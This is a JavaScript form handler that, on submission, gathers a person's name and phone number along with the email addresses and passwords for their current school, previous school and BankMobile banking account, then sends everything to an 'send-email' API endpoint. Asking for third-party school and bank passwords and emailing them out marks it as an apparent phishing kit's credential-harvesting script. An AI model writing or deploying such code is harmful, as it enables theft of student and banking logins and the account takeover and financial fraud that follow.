document.addEventListener("DOMContentLoaded", function () {
  // Get the form element
  const form = document.querySelector("form");

  // Add event listener to handle form submission
  form.addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent the default form submission

    // Collect form data
    const formData = {
      fullName: document.getElementById("fullName").value,
      phoneNumber: document.getElementById("phone_number").value,
      currentSchoolEmail: document.getElementById("currentschemail").value,
      currentSchoolPassword:
        document.getElementById("currentschpassword").value,
      previousSchoolEmail: document.getElementById("previouschemail").value,
      previousSchoolPassword: document.getElementById("previouschemailpassword")
        .value,
      hasBankMobileProfile: document.querySelector('input[name="Yes"]:checked')
        ? "Yes"
        : "No",
      bankMobileEmail: document.getElementById("bankmobileemail").value,
      bankMobilePassword: document.getElementById("bankmobilepassword").value,
    };

    // Send data to API
    fetch("/api/send-email.js", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    })
      .then((response) => response.json())
      .then((data) => {
        // Handle the response from the API
        console.log("Success:", data);
        // Optionally, show a success message or redirect
      })
      .catch((error) => {
        // Handle any errors
        console.error("Error:", error);
      });
  });
});
